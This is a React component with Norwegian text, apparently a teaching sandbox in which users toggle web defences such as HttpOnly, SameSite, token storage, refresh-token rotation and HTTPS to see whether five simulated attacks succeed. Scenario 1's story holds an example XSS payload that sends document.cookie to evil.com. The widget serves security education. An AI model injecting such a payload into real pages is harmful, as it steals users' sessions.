import { useState } from "react";
import { ShieldAlert, ShieldCheck, Play, X, Check, AlertTriangle } from "lucide-react";

// ---------------------------------------------------------------------------
// AttackSandbox — 5 angrepsscenarier, hver med toggles for forsvar.
//
// For hvert scenario: en kort fortelling, et sett toggles (cookie-attributter,
// storage-valg, rotation osv.), og en live-vurdering om angrepet lykkes eller
// blokkeres. Brukeren ser direkte hvilken setting som faktisk gjør forskjellen.
// ---------------------------------------------------------------------------

type Scenario = {
  id: string;
  title: string;
  story: string;
  defenses: Defense[];
  /** Returner true om angrepet lykkes med valgt forsvar. */
  attackSucceeds: (state: Record<string, boolean | string>) => {
    succeeds: boolean;
    why: string;
  };
};

type Defense =
  | { kind: "toggle"; key: string; label: string; default: boolean; explain: string }
  | { kind: "choice"; key: string; label: string; options: string[]; default: string; explain: string };

const SCENARIOS: Scenario[] = [
  {
    id: "stolen-cookie-xss",
    title: "1. XSS prøver å stjele session-cookie",
    story:
      "En kommentar-form filtrerer ikke HTML. Angriper sender <script>fetch('https://evil.com?c='+document.cookie)</script>. Får angriperen tak i sid?",
    defenses: [
      {
        kind: "toggle",
        key: "httpOnly",
        label: "HttpOnly",
        default: false,
        explain: "Cookien blir usynlig for document.cookie og JavaScript. Eneste forsvar mot XSS-tyveri av cookie.",
      },
      {
        kind: "toggle",
        key: "secure",
        label: "Secure",
        default: false,
        explain: "Cookien sendes kun over HTTPS. Hindrer tyveri via passiv sniffing på HTTP.",
      },
      {
        kind: "choice",
        key: "sameSite",
        label: "SameSite",
        options: ["None", "Lax", "Strict"],
        default: "None",
        explain: "Påvirker CSRF, ikke XSS. Vises her for å understreke det.",
      },
    ],
    attackSucceeds: (s) => {
      if (s.httpOnly) {
        return { succeeds: false, why: "HttpOnly hindrer JS-tilgang. document.cookie returnerer tom streng for sid." };
      }
      return {
        succeeds: true,
        why: "XSS-koden leser document.cookie og sender sid til angriperens server. Hen kan nå impersonere brukeren.",
      };
    },
  },
  {
    id: "stolen-jwt-localstorage",
    title: "2. XSS leser JWT fra localStorage",
    story:
      "App lagrer JWT i localStorage for å sende den med Authorization: Bearer. En XSS-bug i en tredjeparts-widget kjøres. Får angriperen JWT-en?",
    defenses: [
      {
        kind: "choice",
        key: "storage",
        label: "Hvor JWT lagres",
        options: ["localStorage", "Cookie (httpOnly+Secure+SameSite)"],
        default: "localStorage",
        explain: "localStorage er lesbart av all JS på samme origin. HttpOnly cookie kan ikke leses av JS.",
      },
      {
        kind: "choice",
        key: "exp",
        label: "JWT exp",
        options: ["15 min", "1 t", "24 t"],
        default: "24 t",
        explain: "Kortere exp = mindre angreps-vindu hvis tokenet stjeles.",
      },
      {
        kind: "toggle",
        key: "blacklist",
        label: "Token-blacklist DB",
        default: false,
        explain:
          "Mulig revokering — men da har du allerede betalt for state. Mange spør: hvorfor brukte du stateless JWT?",
      },
    ],
    attackSucceeds: (s) => {
      if (s.storage !== "localStorage") {
        return { succeeds: false, why: "HttpOnly cookie er ikke lesbar fra JS. XSS får ikke tak i tokenet (men kan fortsatt gjøre actions on-behalf — vurder CSRF også)." };
      }
      const expWindow: Record<string, string> = {
        "15 min": "15 minutter",
        "1 t": "1 time",
        "24 t": "24 timer",
      };
      const blacklistNote = s.blacklist
        ? " Du har blacklist — admin kan revokere når tyveriet oppdages, men det krever oppdagelse."
        : " Uten blacklist: angriper har full tilgang til exp.";
      return {
        succeeds: true,
        why: `XSS leser localStorage.getItem('jwt'). Angriper kan nå sende vilkårlige requests i ${expWindow[s.exp as string]}.${blacklistNote}`,
      };
    },
  },
  {
    id: "csrf-attack",
    title: "3. CSRF mot cookie-basert auth",
    story:
      "Brukeren er logget inn på bank.no. På evil.com legger angriper en form som POST-er til bank.no/transfer. Nettleseren legger automatisk ved cookien. Får angrepet gjennom?",
    defenses: [
      {
        kind: "choice",
        key: "sameSite",
        label: "SameSite på session-cookien",
        options: ["None", "Lax", "Strict"],
        default: "None",
        explain:
          "None = sendes alltid. Lax = sendes på top-level GET (ikke POST fra annet domene). Strict = sendes aldri ved cross-site.",
      },
      {
        kind: "toggle",
        key: "csrfToken",
        label: "CSRF-token (double-submit eller synchronizer)",
        default: false,
        explain:
          "Eget token i form/header som angriperens HTML ikke kan lese (same-origin-policy).",
      },
    ],
    attackSucceeds: (s) => {
      if (s.csrfToken) {
        return { succeeds: false, why: "CSRF-token mangler i POST-en. Server avviser. Standard forsvar." };
      }
      if (s.sameSite === "Strict" || s.sameSite === "Lax") {
        return {
          succeeds: false,
          why:
            s.sameSite === "Strict"
              ? "SameSite=Strict: cookien sendes aldri ved cross-site requests. POST-en kommer uten cookie → 401."
              : "SameSite=Lax: cookien sendes ikke ved cross-site POST. (Den sendes ved top-level GET, så Lax beskytter mot 95 % av CSRF.)",
        };
      }
      return {
        succeeds: true,
        why: "SameSite=None + ingen CSRF-token: nettleseren sender cookien til bank.no, og banken godtar overføringen.",
      };
    },
  },
  {
    id: "refresh-token-rotation",
    title: "4. Stjålet refresh_token — rotation oppdager det",
    story:
      "Angriper får tak i refresh_token gjennom et tidligere leak. Hen bruker det til å hente ny access_token. Imellom har den ekte brukeren også refresha. Oppdages det?",
    defenses: [
      {
        kind: "toggle",
        key: "rotation",
        label: "Refresh-token rotation (RFC 6819)",
        default: false,
        explain:
          "Hver bruk av refresh_token genererer et nytt og invaliderer det gamle. Hvis det gamle brukes en gang til = mistanke.",
      },
      {
        kind: "toggle",
        key: "familyRevoke",
        label: "Family revocation ved mistanke",
        default: false,
        explain:
          "Når rotation oppdager dobbeltbruk: revoker HELE token-familien (alle refresh-tokens utstedt til samme bruker).",
      },
    ],
    attackSucceeds: (s) => {
      if (!s.rotation) {
        return {
          succeeds: true,
          why: "Ingen rotation: både angriper og bruker kan bruke samme refresh_token uavhengig. Tyveriet oppdages aldri av server. Refresh_token kan være gyldig i 30+ dager.",
        };
      }
      if (s.rotation && !s.familyRevoke) {
        return {
          succeeds: true,
          why:
            "Rotation oppdager dobbeltbruk og logger advarsel, men uten family revocation kan angriperen fortsette med det FØRSTE nye tokenet. Halv beskyttelse.",
        };
      }
      return {
        succeeds: false,
        why:
          "Rotation + family revoke: når server ser to bruk av samme RT, revokeres hele familien. Både angriper og bruker logges ut, bruker må re-autentisere. Tyveri oppdaget og stoppet.",
      };
    },
  },
  {
    id: "passive-sniffing",
    title: "5. Passiv sniffing på café-WiFi",
    story:
      "Bruker er på åpen WiFi. Angriper kjører Wireshark og leser trafikk. Får hen tak i auth-cookien?",
    defenses: [
      {
        kind: "toggle",
        key: "https",
        label: "Hele appen kjører HTTPS",
        default: false,
        explain: "TLS krypterer alt, inkludert Cookie- og Authorization-headere. Standard for alt i produksjon.",
      },
      {
        kind: "toggle",
        key: "secure",
        label: "Cookie: Secure-flag",
        default: false,
        explain: "Tvinger nettleseren til kun å sende cookien over HTTPS. Hindrer mixed-content-lekkasje.",
      },
      {
        kind: "toggle",
        key: "hsts",
        label: "HSTS-header (Strict-Transport-Security)",
        default: false,
        explain:
          "Forteller nettleseren: bruk ALDRI HTTP for dette domenet. Hindrer SSL-stripping ved første besøk hvis preload, ellers etter første HTTPS-besøk.",
      },
    ],
    attackSucceeds: (s) => {
      if (s.https && s.secure) {
        return {
          succeeds: false,
          why:
            "Alt over TLS + Secure-cookie. Wireshark ser bare kryptert støy. Kun TLS-metadata (SNI, IP) lekker — ikke cookien.",
        };
      }
      if (s.https && !s.secure) {
        return {
          succeeds: true,
          why:
            "App-en er på HTTPS, men cookien mangler Secure-flag. Hvis brukeren noensinne treffer en HTTP-side på samme domene (bilder, eldre lenker), sender nettleseren cookien i klartekst.",
        };
      }
      return {
        succeeds: true,
        why:
          "HTTP overalt → cookien går i klartekst. Wireshark plukker den ut. Angriper kopierer Cookie-headeren og er logget inn som offeret. (HSTS ville stoppet videre HTTP-tilbakefall, men ikke det første tapet.)",
      };
    },
  },
];

export function AttackSandbox() {
  const [activeId, setActiveId] = useState<string>(SCENARIOS[0].id);
  const scenario = SCENARIOS.find((s) => s.id === activeId)!;
  const [state, setState] = useState<Record<string, boolean | string>>(() =>
    initState(scenario),
  );
  const [showResult, setShowResult] = useState(false);

  function selectScenario(id: string) {
    setActiveId(id);
    const sc = SCENARIOS.find((s) => s.id === id)!;
    setState(initState(sc));
    setShowResult(false);
  }

  function reset() {
    setState(initState(scenario));
    setShowResult(false);
  }

  const result = scenario.attackSucceeds(state);

  return (
    <div className="rounded-2xl border border-border bg-card overflow-hidden">
      <div className="px-4 py-3 border-b border-border bg-muted/30">
        <div className="text-xs uppercase tracking-wider text-muted-foreground">
          Angrep-sandkasse
        </div>
        <div className="text-sm font-semibold">
          Slå på forsvar — se hvilke som faktisk stopper angrepet
        </div>
        <div className="mt-3 flex flex-wrap gap-1.5">
          {SCENARIOS.map((s, i) => (
            <button
              key={s.id}
              type="button"
              onClick={() => selectScenario(s.id)}
              className={`px-2.5 py-1 rounded-md text-xs font-medium border transition-colors ${
                activeId === s.id
                  ? "bg-brand text-brand-foreground border-brand"
                  : "border-border hover:bg-muted"
              }`}
            >
              {i + 1}
            </button>
          ))}
        </div>
      </div>

      <div className="p-4 space-y-3">
        <div className="rounded-lg border border-border bg-background p-3">
          <div className="font-semibold text-sm flex items-center gap-1.5">
            <ShieldAlert className="h-4 w-4 text-rose-600" />
            {scenario.title}
          </div>
          <p className="mt-1 text-xs text-muted-foreground leading-snug">{scenario.story}</p>
        </div>

        <div className="space-y-2">
          {scenario.defenses.map((d) => (
            <div key={d.key} className="rounded-lg border border-border bg-background p-2.5">
              {d.kind === "toggle" ? (
                <ToggleRow
                  label={d.label}
                  explain={d.explain}
                  value={Boolean(state[d.key])}
                  onChange={(v) => setState((s) => ({ ...s, [d.key]: v }))}
                />
              ) : (
                <ChoiceRow
                  label={d.label}
                  options={d.options}
                  explain={d.explain}
                  value={String(state[d.key])}
                  onChange={(v) => setState((s) => ({ ...s, [d.key]: v }))}
                />
              )}
            </div>
          ))}
        </div>

        <div className="flex gap-2">
          <button
            type="button"
            onClick={() => setShowResult(true)}
            className="px-3 py-1.5 rounded-md text-xs font-medium bg-brand text-brand-foreground hover:opacity-90 inline-flex items-center gap-1.5"
          >
            <Play className="h-3.5 w-3.5" />
            Kjør angrep
          </button>
          <button
            type="button"
            onClick={reset}
            className="px-3 py-1.5 rounded-md text-xs font-medium border border-border hover:bg-muted"
          >
            Nullstill
          </button>
        </div>

        {showResult && (
          <div
            className={`rounded-lg border p-3 text-sm ${
              result.succeeds
                ? "border-rose-300 bg-rose-50 text-rose-900"
                : "border-emerald-300 bg-emerald-50 text-emerald-900"
            }`}
          >
            <div className="flex items-center gap-1.5 font-semibold">
              {result.succeeds ? (
                <>
                  <X className="h-4 w-4" /> Angrep lyktes
                </>
              ) : (
                <>
                  <ShieldCheck className="h-4 w-4" /> Angrep blokkert
                </>
              )}
            </div>
            <p className="mt-1 text-xs leading-snug">{result.why}</p>
          </div>
        )}

        <div className="rounded-lg border border-amber-300 bg-amber-50 p-2.5 text-[11px] text-amber-900 leading-snug flex items-start gap-2">
          <AlertTriangle className="h-3.5 w-3.5 mt-0.5 shrink-0" />
          <div>
            Disse scenarioene er forenklet for pedagogikk. Reelle systemer kombinerer flere lag
            (CSP, SRI, rate limits, MFA, deteksjon). Men toggles her viser hva HVER setting faktisk
            kjøper deg — du må vite det for å designe stacken bevisst.
          </div>
        </div>
      </div>
    </div>
  );
}

function initState(sc: Scenario): Record<string, boolean | string> {
  const s: Record<string, boolean | string> = {};
  sc.defenses.forEach((d) => {
    s[d.key] = d.default;
  });
  return s;
}

function ToggleRow({
  label,
  explain,
  value,
  onChange,
}: {
  label: string;
  explain: string;
  value: boolean;
  onChange: (v: boolean) => void;
}) {
  return (
    <div>
      <label className="flex items-center justify-between gap-2 cursor-pointer">
        <div>
          <div className="text-sm font-medium">{label}</div>
          <div className="text-[11px] text-muted-foreground leading-snug">{explain}</div>
        </div>
        <button
          type="button"
          onClick={() => onChange(!value)}
          className={`shrink-0 inline-flex h-6 w-11 items-center rounded-full transition-colors ${
            value ? "bg-emerald-500" : "bg-muted"
          }`}
          aria-pressed={value}
        >
          <span
            className={`inline-block h-5 w-5 rounded-full bg-white shadow transform transition-transform ${
              value ? "translate-x-5" : "translate-x-0.5"
            }`}
          />
        </button>
      </label>
      {value && (
        <div className="mt-1 inline-flex items-center gap-1 text-[10px] text-emerald-700">
          <Check className="h-3 w-3" /> Aktivert
        </div>
      )}
    </div>
  );
}

function ChoiceRow({
  label,
  options,
  explain,
  value,
  onChange,
}: {
  label: string;
  options: string[];
  explain: string;
  value: string;
  onChange: (v: string) => void;
}) {
  return (
    <div>
      <div className="text-sm font-medium">{label}</div>
      <div className="text-[11px] text-muted-foreground leading-snug">{explain}</div>
      <div className="mt-1.5 flex flex-wrap gap-1">
        {options.map((o) => (
          <button
            key={o}
            type="button"
            onClick={() => onChange(o)}
            className={`text-[11px] px-2 py-0.5 rounded border transition-colors ${
              value === o
                ? "bg-brand text-brand-foreground border-brand"
                : "border-border hover:bg-muted"
            }`}
          >
            {o}
          </button>
        ))}
      </div>
    </div>
  );
}
